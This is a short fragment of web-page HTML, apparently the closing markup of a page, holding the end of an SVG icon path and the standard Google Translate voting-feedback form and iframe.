4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>





</body></html>